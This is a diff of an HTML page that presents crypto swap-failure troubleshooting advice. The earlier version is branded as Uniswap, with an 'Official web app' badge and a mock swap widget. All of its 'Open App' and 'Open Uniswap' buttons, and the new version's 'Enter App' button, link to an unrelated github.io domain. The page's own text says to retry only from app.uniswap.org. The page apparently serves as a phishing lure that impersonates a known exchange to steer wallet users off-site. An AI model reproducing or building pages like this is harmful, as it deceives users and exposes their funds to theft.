@@ -1,153 +1,120 @@
 <!doctype html>
-<html lang="en"><head>
-<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>Swap Failed - Open Uniswap App</title><meta name="description" content="swap failed on a DEX? Open the Uniswap app, review token, network, slippage, and gas settings, then retry from the official interface.">
-<meta name="robots" content="index,follow,max-image-preview:large">
-<link rel="canonical" href="https://swap-failed.github.io/"><meta name="theme-color" content="#FFFFFF">
-<meta property="og:type" content="website"><meta property="og:title" content="Swap Failed - Open Uniswap App"><meta property="og:description" content="swap failed on a DEX? Open the Uniswap app, review token, network, slippage, and gas settings, then retry from the official interface.">
-<meta property="og:url" content="https://swap-failed.github.io/"><meta property="og:image" content="https://swap-failed.github.io/og-cover.png"><meta property="og:locale" content="en">
-<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Swap Failed - Open Uniswap App"><meta name="twitter:description" content="swap failed on a DEX? Open the Uniswap app, review token, network, slippage, and gas settings, then retry from the official interface."><meta name="twitter:image" content="https://swap-failed.github.io/og-cover.png">
-<link rel="icon" href="favicon.png" type="image/png"><link rel="manifest" href="site.webmanifest"><link rel="apple-touch-icon" href="static/icon-180.png">
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap">
-<link rel="stylesheet" href="static/style.css">
-<script type="application/ld+json">{
-  "@context": "https://schema.org",
-  "@graph": [
-    {
-      "@type": "WebSite",
-      "@id": "https://swap-failed.github.io/#website",
-      "url": "https://swap-failed.github.io/",
-      "name": "Uniswap"
-    },
-    {
-      "@type": "WebPage",
-      "@id": "https://swap-failed.github.io/#webpage",
-      "url": "https://swap-failed.github.io/",
-      "name": "Swap Failed - Open Uniswap App",
-      "description": "swap failed on a DEX? Open the Uniswap app, review token, network, slippage, and gas settings, then retry from the official interface.",
-      "inLanguage": "en",
-      "isPartOf": {
-        "@id": "https://swap-failed.github.io/#website"
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Swap Failed</title>
+  <meta name="description" content="Swap Failed explains common token swap failure causes and how to diagnose a retry.">
+  <link rel="canonical" href="https://swap-failed.github.io/">
+  <meta name="robots" content="index,follow,max-image-preview:large">
+  <meta name="theme-color" content="#F7F4EF">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Swap Failed">
+  <meta property="og:description" content="Swap Failed explains common token swap failure causes and how to diagnose a retry.">
+  <meta property="og:url" content="https://swap-failed.github.io/">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Swap Failed">
+  <meta name="twitter:description" content="Swap Failed explains common token swap failure causes and how to diagnose a retry.">
+  <link rel="icon" type="image/png" href="favicon.png">
+  <link rel="apple-touch-icon" href="favicon.png">
+  <link rel="manifest" href="site.webmanifest">
+  <link rel="stylesheet" href="style.css">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "WebSite",
+        "@id": "https://swap-failed.github.io/#website",
+        "url": "https://swap-failed.github.io/",
+        "name": "Swap Failed",
+        "inLanguage": "en"
+      },
+      {
+        "@type": "WebApplication",
+        "@id": "https://swap-failed.github.io/#app",
+        "name": "Swap Failed",
+        "applicationCategory": "FinanceApplication",
+        "operatingSystem": "Web",
+        "url": "https://swap-failed.github.io/"
+      },
+      {
+        "@type": "Organization",
+        "@id": "https://swap-failed.github.io/#organization",
+        "name": "Swap Failed",
+        "url": "https://swap-failed.github.io/",
+        "logo": "https://swap-failed.github.io/favicon.png"
       }
-    },
-    {
-      "@type": "Organization",
-      "@id": "https://swap-failed.github.io/#org",
-      "name": "Uniswap",
-      "url": "https://swap-failed.github.io/",
-      "logo": "https://swap-failed.github.io/og-cover.png",
-      "sameAs": [
-        "https://x.com/Uniswap",
-        "https://github.com/Uniswap",
-        "https://defillama.com/protocol/uniswap"
-      ]
-    },
-    {
-      "@type": "WebApplication",
-      "@id": "https://swap-failed.github.io/#app",
-      "name": "Swap Failed",
-      "url": "https://swap-failed.github.io/",
-      "applicationCategory": "FinanceApplication",
-      "operatingSystem": "Web",
-      "browserRequirements": "Requires JavaScript",
-      "description": "swap failed on a DEX? Open the Uniswap app, review token, network, slippage, and gas settings, then retry from the official interface.",
-      "featureList": [
-        "Official web app",
-        "Non-custodial swaps",
-        "Multi-network deployments"
-      ],
-      "isPartOf": {
-        "@id": "https://swap-failed.github.io/#website"
-      }
-    },
-    {
-      "@type": "FAQPage",
-      "@id": "https://swap-failed.github.io/#faq",
-      "inLanguage": "en",
-      "mainEntity": [
-        {
-          "@type": "Question",
-          "name": "Why did my Uniswap swap fail?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "Common causes include slippage limits, expired transaction deadline, insufficient native gas token, unsupported token behavior, token transfer fees, stale quote, wallet rejection, or wrong network. Uniswap support explains these failure categories, and the Uniswap transaction failure support page is the source for this checklist."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "Can a failed swap still cost gas?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "Yes. If the transaction was broadcast and reverted on-chain, gas can still be charged for the attempted execution. Ethereum gas documentation explains why computation and validation use gas, and an Ethereum block explorer such as Etherscan can confirm whether the transaction reached the chain."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "Should I increase slippage after a swap failed?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "Not automatically. Higher slippage can help with volatile or fee-on-transfer tokens, but it also accepts worse execution. Uniswap slippage guidance and Uniswap price impact support both recommend checking token legitimacy, price impact, liquidity, route, gas, and router support before changing the setting."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "Why did approval work but swap failed?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "Approval and swap are often separate transactions. Uniswap approval transaction support explains that an approval grants spending permission, while the later swap can still fail because of slippage, gas, token restrictions, expired deadline, or insufficient liquidity. Review and revoke approvals if they are no longer needed."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "What does transaction deadline expired mean on Uniswap?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "It means the swap was not executed within the app's deadline window, often because gas settings were too low or network conditions delayed inclusion. Uniswap transaction failure support describes the transaction deadline mechanism; reopen the official app, refresh the quote, check network cost, and submit a new transaction only if the details are correct."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "Where should I retry after a swap failed?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "Retry only from the official app domain, such as app.uniswap.org, or a trusted wallet route. Ethereum wallets guidance explains that wallets sign transactions from the user's device; avoid search ads, copied support links, or direct messages offering to fix a failed swap, and never share a seed phrase or private key."
-          }
-        }
-      ]
-    }
-  ]
-}</script>
-</head><body>
-<header class="site-header">
-  <a class="brand" href="#top" aria-label="Uniswap"><img class="brand-mark" src="favicon.png" alt="" width="34" height="34"><span class="brand-name">Uniswap</span></a>
-  <nav class="site-nav" aria-label="Primary"><ul class="nav-list"><li><a href="#about">About</a></li><li><a href="#facts">Overview</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
-  <span class="header-spacer"></span>
-  <a class="btn btn-dark header-cta" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a>
-  <button class="nav-toggle" aria-label="Menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
-</header>
-<main id="top">
-  <section class="hero">
-    <div class="hero-deco" aria-hidden="true"><span class="strip"></span><span class="d1"></span><span class="d2"></span><span class="d3"></span><span class="d4"></span><span class="d5"></span></div>
-    <div class="container">
+    ]
+  }
+  </script>
+</head>
+<body>
+  <header class="topbar">
+    <a class="brand" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer" aria-label="Swap Failed home">
+      <img src="simpleswap.png" width="30" height="30" alt="">
+      <span>Swap Failed</span>
+    </a>
+
+    <nav class="nav" aria-label="Authority references">
+      <a href="https://etherscan.io/" target="_blank" rel="nofollow noopener noreferrer">Etherscan</a>
+      <a href="https://ethereum.org/developers/docs/gas/" target="_blank" rel="nofollow noopener noreferrer">Gas docs</a>
+      <a href="https://support.metamask.io/" target="_blank" rel="nofollow noopener noreferrer">MetaMask support</a>
+    </nav>
+
+    <span class="spacer" aria-hidden="true"></span>
+    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+  </header>
+
+  <main class="stage">
+    <section class="hero" aria-label="Swap Failed">
       <h1>Swap Failed</h1>
-      <div class="bridge-widget" role="group" aria-label="Uniswap preview"><div class="bw-field"><span class="bw-coin"><img src="static/eth.png" alt="ETH" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0</span><span class="bw-sub"><b>ETH</b> · Ethereum</span></span></div><button class="bw-switch" type="button" aria-label="Switch"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 9h13M17 9l-4-4M17 9l-4 4M20 15H7M7 15l4-4M7 15l4 4"/></svg></button><div class="bw-field"><span class="bw-coin"><img src="static/usdc.png" alt="USDC" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0.0</span><span class="bw-sub"><b>USDC</b> · Ethereum</span></span></div><a class="btn btn-dark bw-go" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a></div>
-      <div class="hero-go"><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Uniswap ↗</a></div>
-      <p class="hero-note">Live preview — open the official Uniswap app from your own wallet.</p>
-      <div class="trust-row"><span class="trust-chip">Official web app</span><span class="trust-chip">Non-custodial swaps</span><span class="trust-chip">Multi-network deployments</span></div>
-    </div>
-  </section>
-  <section class="section" id="about"><div class="container"><h2>What is Swap Failed?</h2><div class="capsule"><strong>Uniswap</strong> is the official app destination for retrying an EVM token trade after a wallet rejection, stale quote, tight slippage limit, or network issue. The protocol is a non-custodial automated market maker documented in the <a class="inline-link" href="https://developers.uniswap.org/docs/trading/overview" rel="noopener noreferrer">Uniswap trading docs</a>, with wallet signing and on-chain submission handled outside this page.</div></div></section>
-  <section class="section" id="facts"><div class="container"><h2>Swap Failed at a glance</h2><div class="facts"><div class="f"><small>Category</small><b>DEX swap troubleshooting</b></div><div class="f"><small>Network</small><b><a class="inline-link" href="https://developers.uniswap.org/docs/protocols/v4/deployments" rel="noopener noreferrer">Ethereum and EVM networks</a></b></div><div class="f"><small>Token</small><b>Varies by pair</b></div><div class="f"><small>Custody</small><b><a class="inline-link" href="https://ethereum.org/wallets/" rel="noopener noreferrer">Wallet-signed transactions</a></b></div></div></div></section>
-  <section class="section section-alt"><div class="container"><h2>Uniswap swap failed slippage limits</h2><div class="intent-a">A Uniswap swap failed message often comes from slippage limits. Slippage is the allowed difference between the quoted output and the real output when the transaction executes, and <a class="inline-link" href="https://support.uniswap.org/hc/en-us/articles/8643879653261-How-to-change-slippage-on-the-Uniswap-Web-app" rel="noopener noreferrer">Uniswap slippage guidance</a> explains why a low setting can make a transaction revert. This can happen in volatile pairs, low-liquidity pools, fee-on-transfer tokens, or during network congestion. The fix is not automatically to raise slippage. First refresh the quote, check price impact, verify the token contract, and reduce trade size if needed. Only adjust slippage after understanding the extra execution risk, especially for unfamiliar tokens.</div></div></section><section class="section"><div class="container"><h2>Uniswap swap failed because transaction deadline expired</h2><div class="intent-a">A Uniswap swap can fail when the transaction deadline expires before the transaction confirms. <a class="inline-link" href="https://support.uniswap.org/hc/en-us/articles/8643975058829-Why-did-my-transaction-fail" rel="noopener noreferrer">Uniswap transaction failure support</a> describes a deadline mechanism intended to stop stale swaps from executing after significant price movement. This can happen if the wallet's network cost setting is too low, the chain is congested, or the user waits too long after building the quote. The practical fix is to reopen the official app, refresh the quote, check gas settings, and submit a new transaction only if the wallet prompt matches the intended trade. Do not reuse copied support links or sign replacement transactions from unofficial pages.</div></div></section><section class="section section-alt"><div class="container"><h2>Uniswap swap failed insufficient funds for gas</h2><div class="intent-a">A swap failed error can appear even when the wallet has enough input tokens if it lacks the network token for gas. On Ethereum, gas is paid in ETH, and the <a class="inline-link" href="https://ethereum.org/developers/docs/gas/" rel="noopener noreferrer">Ethereum gas documentation</a> explains how network costs pay for transaction execution. On other EVM networks, gas is paid in that network's native token. WETH, USDC, WBTC, or another <a class="inline-link" href="https://ethereum.org/developers/docs/standards/tokens/erc-20/" rel="noopener noreferrer">ERC-20 token balance</a> cannot normally pay the chain fee. Users should keep enough native gas token for both approval and swap transactions. If an approval succeeds but the swap fails, the wallet may still have spent gas on the approval. Check the transaction hash in a block explorer to see whether the failed action reached the chain or was only rejected in the wallet.</div></div></section><section class="section"><div class="container"><h2>Uniswap swap failed token not supported or token fee</h2><div class="intent-a">Some swap failed cases come from token behavior rather than the Uniswap app itself. Uniswap support notes that token fees can require different execution settings and that rebasing, reflection, or debasing tokens are not supported by the Uniswap v3 or v4 routers. The dedicated <a class="inline-link" href="https://support.uniswap.org/hc/en-us/articles/23331763733517-Error-message-Swap-failed" rel="noopener noreferrer">Swap failed support article</a> also points to variable buy or sell fees, non-standard approvals, and math errors as reasons the interface may not complete a route. Scam or restricted tokens can block sells, impose transfer taxes, or fail on specific routes. Before retrying, inspect token warnings, contract address, liquidity, buy/sell fee claims, and whether the route uses a supported router. If the token is unfamiliar, raising slippage can make execution worse rather than solve the underlying contract restriction.</div></div></section><section class="section section-alt"><div class="container"><h2>Uniswap swap failed but gas was charged</h2><div class="intent-a">If a failed swap transaction reaches the blockchain and reverts, gas can still be charged because validators or block builders processed the attempted execution. If the user rejects the transaction inside the wallet before broadcast, there is normally no on-chain gas cost. The key is to check the transaction hash: a block explorer can show whether the transaction was successful, reverted, pending, or never submitted. A reverted swap does not deliver output tokens, but <a class="inline-link" href="https://support.uniswap.org/hc/en-us/articles/8120520483085-What-is-an-approval-transaction" rel="noopener noreferrer">approval transactions</a> from a separate successful step can remain active. After repeated failures, review approvals, token route, slippage, gas, and exact network instead of blindly retrying; if a spending permission is no longer needed, Uniswap documents how to revoke token approvals.</div></div></section>
-  <section class="section"><div class="container"><h2>How to swap Swap Failed</h2><ol class="steps"><li><b>Open the app</b><span>Use the official Uniswap swap page and confirm the domain before connecting a wallet.</span></li><li><b>Check the pair</b><span>Review the input token, output token, network, and token contract before signing; the <a class="inline-link" href="https://eips.ethereum.org/EIPS/eip-20" rel="noopener noreferrer">ERC-20 standard</a> is the baseline interface most Ethereum tokens follow, but token-specific rules can still affect execution.</span></li><li><b>Refresh execution</b><span>Get a fresh quote, review price impact, slippage tolerance, and available gas on the selected chain.</span></li><li><b>Retry carefully</b><span>Submit only after the wallet simulation and final transaction details match what you expect.</span></li></ol><div class="cta-band"><div><p>Ready to swap?</p><p class="sub">Open the official Uniswap app and verify the domain before you sign.</p></div><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Uniswap ↗</a></div></div></section>
-  <section class="section section-alt" id="risk"><div class="container"><h2>Fees, custody, and retry risks</h2><div class="cards three"><article class="card"><h3>Network costs</h3><p>Failed on-chain execution can still consume gas; review the <a class="inline-link" href="https://ethereum.org/developers/docs/gas/" rel="noopener noreferrer">gas fee model</a> before retrying with different settings.</p></article><article class="card"><h3>Wallet custody</h3><p>Uniswap swaps are signed from a user's wallet, so compare the wallet prompt with <a class="inline-link" href="https://ethereum.org/wallets/" rel="noopener noreferrer">wallet custody guidance</a> before approving or swapping.</p></article><article class="card"><h3>Token permissions</h3><p>Approvals can outlive a failed swap, and <a class="inline-link" href="https://support.uniswap.org/hc/en-us/articles/15724901841037-How-to-revoke-a-token-approval" rel="noopener noreferrer">approval revocation steps</a> may be useful after repeated failed attempts.</p></article></div><div class="note-irreversible"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 9v4"/><path d="M12 17h.01"/><path d="M10.29 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0Z"/></svg><span>On-chain actions are irreversible; this page is educational and not financial advice.</span></div></div></section>
-  <section class="section section-alt" id="faq"><div class="container"><h2>Swap Failed FAQ</h2><div class="faq-list"><details open><summary><h3>Why did my Uniswap swap fail?</h3></summary><div>Common causes include slippage limits, expired transaction deadline, insufficient native gas token, unsupported token behavior, token transfer fees, stale quote, wallet rejection, or wrong network. <a class="inline-link" href="https://support.uniswap.org/hc/en-us/articles/8643975058829-Why-did-my-transaction-fail" rel="noopener noreferrer">Uniswap support</a> groups these as separate failure categories, so inspect the wallet prompt and route before submitting another transaction.</div></details><details><summary><h3>Can a failed swap still cost gas?</h3></summary><div>Yes. If the transaction was broadcast and reverted on-chain, gas can still be charged for the attempted execution. If you only rejected the wallet prompt before broadcast, there is normally no on-chain gas charge. Check the transaction hash in <a class="inline-link" href="https://etherscan.io/" rel="noopener noreferrer">Etherscan</a> or the relevant network explorer to confirm.</div></details><details><summary><h3>Should I increase slippage after a swap failed?</h3></summary><div>Not automatically. Higher slippage can help with volatile or fee-on-transfer tokens, but it also accepts worse execution. First check token legitimacy, <a class="inline-link" href="https://support.uniswap.org/hc/en-us/articles/8671539602317-What-is-price-impact" rel="noopener noreferrer">price impact support</a>, liquidity, route, gas, and whether the token is supported by the router being used.</div></details><details><summary><h3>Why did approval work but swap failed?</h3></summary><div>Approval and swap are often separate transactions. The approval may succeed because it only grants token spending permission, while the swap can still fail because of slippage, gas, token restrictions, expired deadline, or insufficient liquidity. Uniswap's <a class="inline-link" href="https://support.uniswap.org/hc/en-us/articles/8120520483085-What-is-an-approval-transaction" rel="noopener noreferrer">approval transaction explainer</a> is the reference for how this permission step differs from the swap.</div></details><details><summary><h3>What does transaction deadline expired mean on Uniswap?</h3></summary><div>It means the swap was not executed within the app's deadline window, often because gas settings were too low or network conditions delayed inclusion. <a class="inline-link" href="https://support.uniswap.org/hc/en-us/articles/8643975058829-Why-did-my-transaction-fail" rel="noopener noreferrer">Transaction failure support</a> describes this deadline behavior; reopen the official app, refresh the quote, check network cost, and submit a new transaction only if the details are correct.</div></details><details><summary><h3>Where should I retry after a swap failed?</h3></summary><div>Retry only from the official app domain, such as app.uniswap.org, or a trusted wallet route. <a class="inline-link" href="https://ethereum.org/wallets/" rel="noopener noreferrer">Ethereum wallet guidance</a> is a useful baseline for wallet custody and signing; avoid search ads, copied support links, or direct messages offering to fix a failed swap. A legitimate retry should never require a seed phrase or private key.</div></details></div></div></section>
-</main>
-<footer class="site-footer"><div class="container">
-  <div class="footer-grid"><div class="footer-col" style="max-width:none"><h4>Sources</h4><nav aria-label="Sources"><a href="https://support.uniswap.org/hc/en-us/articles/8643975058829-Why-did-my-transaction-fail" target="_blank" rel="noopener noreferrer">Uniswap transaction failure support</a><a href="https://support.uniswap.org/hc/en-us/articles/8671539602317-What-is-price-impact" target="_blank" rel="noopener noreferrer">Uniswap price impact support</a><a href="https://developers.uniswap.org/docs/trading/overview" target="_blank" rel="noopener noreferrer">Uniswap trading overview</a><a href="https://app.uniswap.org/swap" target="_blank" rel="noopener noreferrer">Uniswap web app</a><a href="https://ethereum.org/en/wallets/" target="_blank" rel="noopener noreferrer">Ethereum wallets guide</a></nav></div></div>
-  <p class="footer-note">Not the official app; verify the domain before connecting a wallet. Educational content only, not financial advice.</p>
-  <p class="footer-meta"><a href="#top">Back to top ↑</a></p>
-</div></footer>
-<script src="static/app.js" defer></script>
-</body></html>
+      <p class="value"><strong>Swap Failed</strong> helps explain why a token swap can fail before you diagnose and retry.</p>
+    </section>
+
+    <section class="app-card" aria-label="Swap retry diagnostic">
+      <div class="route">
+        <div class="leg">
+          <span class="label">Failed swap</span>
+          <span class="chip">
+            <img src="btc.png" width="28" height="28" alt="BTC">
+            <span>Token</span>
+          </span>
+        </div>
+
+        <button class="switch" type="button" data-switch aria-label="Review swap retry direction">
+          <span aria-hidden="true">&#8594;</span>
+        </button>
+
+        <div class="leg">
+          <span class="label">Retry check</span>
+          <span class="chip">
+            <img src="eth.png" width="28" height="28" alt="ETH">
+            <span>Route</span>
+          </span>
+        </div>
+      </div>
+
+      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&#8250;</span></a>
+    </section>
+  </main>
+
+  <footer class="footer">Swap Failed &mdash; 2026</footer>
+
+  <script>
+  (function () {
+    "use strict";
+    var button = document.querySelector("[data-switch]");
+    if (!button) return;
+
+    button.addEventListener("click", function () {
+      var chips = document.querySelectorAll(".chip");
+      if (chips.length < 2) return;
+      var first = chips[0].innerHTML;
+      chips[0].innerHTML = chips[1].innerHTML;
+      chips[1].innerHTML = first;
+    });
+  }());
+  </script>
+</body>
+</html>
